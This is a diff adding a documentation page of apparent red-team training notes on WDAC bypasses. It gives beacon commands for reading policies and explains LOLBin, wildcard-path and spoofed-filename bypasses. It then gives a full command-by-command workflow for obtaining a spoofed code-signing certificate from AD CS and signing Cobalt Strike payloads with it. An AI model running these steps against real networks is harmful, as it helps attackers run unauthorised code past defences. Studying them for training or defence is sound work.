@@ -1,0 +1,182 @@
+import { Tab, Tabs, Callout } from 'nextra-theme-docs'
+
+### **WDAC** Intro
+- **WDAC** (Wiodows Defender Application Control) is a Windows technology designed to control which applications and drivers are allowed to run on a machine.
+- The difference between the **WDAC** and **Applocker** is that  Microsoft  recognizes the **WDAC** as an official security boundaries. which means that it's substantially more robust and applicable bypasses are actually fixed (and a CVE often issued to the finder).
+- The term "WDAC bypass" is used herein, but this is disingenuous since we're never actually bypassing WDAC at a fundamental level.  Instead, we must find weaknesses in the policy deployed by an organisation.
+- **WDAC** policies are first defined in XML format - Microsoft ships several base policies which can be found under `C:\Windows\schemas\CodeIntegrity\ExamplePolicies`.  Multiple policies can be merged into a single policy, which is then packaged into a `.p7b` file and pushed out via GPO (or another management platform such as **Intune**).
+- Just like **ASR** the policies can be enumerated from a amchine that they're applied to from this path `C:\Windows\System32\CodeIntegrity` or from Domain GPO which points to the `p7b` file which needs to be downloaded and applied by each machine.
+    ```txt 
+    beacon> ls \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\
+
+    Size     Type    Last Modified         Name
+    ----     ----    -------------         ----
+    549b     fil     04/05/2023 10:41:45   comment.cmtx
+    432b     fil     04/05/2023 10:41:45   Registry.pol
+
+    beacon> download \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\Registry.pol
+    [*] download of Registry.pol is complete
+    ```
+
+- Then we can use [CIPolicyParser](https://gist.github.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e) to decompile it back to readable format
+    ```powershell copy 
+    ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath CIPolicy.xml
+    ```
+- The  **WDAC** can most common rules to control what application to run:
+    - **Hash** - allows binaries to run based on their hash values.
+    - **FileName** - allows binaries to run based on their original filename.
+    - **FilePath** - allows binaries to run from specific file path locations.
+    - **Publisher** - allows binaries to run that are signed by a particular CA.
+
+### **WDAC** bypasses
+#### **LOLs** 
+(Living off the land binaries, Scripts and Libraries)
+    - As is the case with AppLocker, there are many native Windows binaries and scripts that can be used to execute arbitrary code and bypass WDAC.  These bypass a typical WDAC policy because signed Windows applications are trusted by default. and ofcourse  Microsoft has a [recommended block list](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules) to stop that, but we can enumerate it and find if there is any one missing sothat we can use it. We can use [Ultimate WDAC Bypass List](https://github.com/bohops/UltimateWDACBypassList) for help
+    - These are FileName rules, so they look at the filename an application was original compiled with. These are baked into the application themselves and can be seen in their properties.
+    ![wdac-1](/images/wdac-1.png)
+#### **WildCard file paths**
+**Code Signing  or (publisher)** is the most robust rule to implement the **WDAC**, but not all the developers sign their code, just like **7-zip**
+    ![wdac-2](/images/wdac-2.png)
+    so it needs an allow rule, which may be misconfiguered (By putting a wildcard as a path to the binary files of the application) which allows us to  run binaries from within that folder
+    ![wdac-3](/images/wdac-3.png)
+
+    ![wdac-3](/images/wdac-4.png)
+
+    <Callout type="info" emoji="👻">
+    There is a gotcha with **FilePath** rules called **Runtime FilePath Rule Protection**. This is enabled by default and what it does is check the DACL of the path at runtime.  If the path is writeable by any non-administrative users, then **WDAC** will block execution despite the fact the path is allowed in the policy.
+
+    So in this particular example, if there was a DACL misconfiguration on `C:\Program Files\7-Zip` that allowed standard users to drop executables in there, then **WDAC** would just block everything in the entire directory.
+    </Callout> 
+#### **FileName**
+![wdac-5](/images/wdac-5.png)
+This is the filename from the zip installer, which it was compiled with (filename and file version), we can compile our payload with that specific metadata easily
+![wdac-6](/images/wdac-6.png)
+
+    ![wdac-7](/images/wdac-7.png)
+and this is how our newly compiled payload looks like
+![wdac-8](/images/wdac-8.png)
+Now our binary bypasses the rule and can execute
+![wdac-9](/images/wdac-9.png)
+
+#### Trusted Signers 
+- Some organisations build and maintain their own custom **LOB** (Line of business) applications which may be signed using an **internal certificate authority**, such as Active Directory Certificate Services. Those CAs can be trusted by their WDAC policy in order for them to run their own apps.
+- **WDAC** has 2 levels of Certificate policy **Leaf** (end-entity) and **PCA** (private CA). And we don't count the **ROOT CA** as a level.
+- Trusting a **leaf** certificate puts a little bit of a headache because the admins to trust every end-entity certificate individually. but Trusting their **PCA** is a one click operation and all the signed certificates by that CA are trusted.
+
+##### Signers Enumeration
+- We can get the signer info of a binary using the build in powershell cmdlet
+
+    ```powershell copy filename="Powershell"
+    Get-AuthenticodeSignature -FilePath '~\file.exe' | fl
+    ```
+    ![wdac-10](/images/wdac-10.png)
+
+- This is how the signer rule looks like 
+    ![wdac-11](/images/wdac-11.png)
+    - **TBS** stands for to be signed
+    - **value** contains the hash of the signer certificate
+
+##### Signers Bypass
+To bypass this rule, we need the signer certificate that this policy is issued for. or request our own certificate from the code signing template:
+    1. Search all the certificates templates in the CA that are for Code Signing 
+        ```bash copy filename="beacon>"
+        execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /ca:sub-ca.acme.corp\sub-ca
+        ```
+        ![wdac-12](/images/wdac-12.png)
+    2. Request a certificate, can be done in **3** ways:
+        - From the **Certificates snap-in in MMC** from a domain-joined machine
+            ![wdac-13](/images/wdac-13.png)
+
+            And because `ENROLLEE_SUPPLIES_SUBJECT` is enabled we can supply any subject name, so we'll replicate the same subject name that was in the certificate of the binary in the rule we're trying to bypass "**CN=ACME Corp**"
+            ![wdac-14](/images/wdac-14.png)
+       
+        -  Using the native **certutil** and **certreq** tools 
+            1. Create a `.inf` file with the follwing content
+                Pay attenction to  **Subject**, **CertificateTemplate** and **OID**
+                ```text copy filename="csr.inf" showLineNumbers {2, 19, 22}
+                [NewRequest]
+                Subject = "CN=ACME Corp"
+
+                KeySpec = 1
+                KeyLength = 2048
+                Exportable = TRUE
+                MachineKeySet = FALSE
+                SMIME = False
+                PrivateKeyArchive = FALSE
+                UserProtected = FALSE
+                UseExistingKeySet = FALSE
+                ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+                ProviderType = 12
+                RequestType = PKCS10
+                KeyUsage = 0xa0
+                HashAlgorithm = SHA256
+
+                [RequestAttributes]
+                CertificateTemplate=RTOCodeSigning
+
+                [EnhancedKeyUsageExtension]
+                OID=1.3.6.1.5.5.7.3.3
+                ```
+            2. Convert it to a `csr` format 
+
+                ```powershell filename="Powershell" copy 
+                certreq -new -config sub-ca.acme.corp\sub-ca acme.inf acme.csr
+                ```
+            3. Submit the **CSR** to the **CA**
+
+                ```powershell filename="Powershell" copy 
+                certreq -submit -config sub-ca.acme.corp\sub-ca acme.csr cert.cer
+                ```
+            4. The provided certificate does not include the private key, so we have to install the certificate and then re-export it with the private key.
+
+                ```powershell filename="Powershell" copy 
+                certreq -accept cert.cer
+                ```
+            5. List the certificates in our personal store to get the ID of the cert that we just imported.
+
+                ```powershell filename="Powershell" copy 
+                certutil -user -store My
+                ```
+            6. Export the certificate  with the private key and password
+
+                ```powershell filename="Powershell" copy
+                certutil -user -exportpfx -privatekey -p pass123 My 0 acme.pfx
+                ```
+            7. Download the exported `pfx` certificate to our attacker machine and use `signtool` to sign our executables with it.
+                
+                ```powershell filename="Powershell" copy
+                signtool sign /f acme.pfx /p pass123 /fd SHA256 C:\Payloads\https_x64.exe
+                ```
+                ![wdac-15](/images/wdac-15.png)
+        - Cobalt Strike workflow
+            1. Because cobalt is built in java, we'll need a java keystore 
+
+                ```bash copy filename="Bash"
+                keytool -genkey -alias server -keyalg RSA -keysize 2048 -storetype jks -keystore keystore.jks -dname "CN=ACME Corp"
+                ```
+            2. Generate a **CSR** from within  the keystore, this will generate a `req.csr` file
+
+                ```bash copy filename="Bash"
+                 keytool -certreq -alias server -file req.csr -keystore keystore.jks
+                ```
+
+            3. If enabled, we can submit the **CSR** via the CertSrv web UI.
+                ![wdac-16](/images/wdac-16.png)
+            
+            4. Download the **Certificate Chain**
+
+            5. Import the certificate into the keystore
+
+                ```bash copy filename="Bash"
+                 keytool -import -trustcacerts -alias server -file certnew.p7b -keystore keystore.jks
+                ```
+            6. add the following to our c2 profile
+                ```json copy filename="c2.profile"
+                code-signer {
+                    set keystore "keystore.jks";
+                    set password "pass123";
+                    set alias "server";
+                }
+                ```
+            7. Restart the teamserver and **Payloads** > **Windows Stageless Generate All Payloads** and tick the `Sign the executable files`. and all our executables will be signed by this certificate
+                ![wdac-17](/images/wdac-17.png)
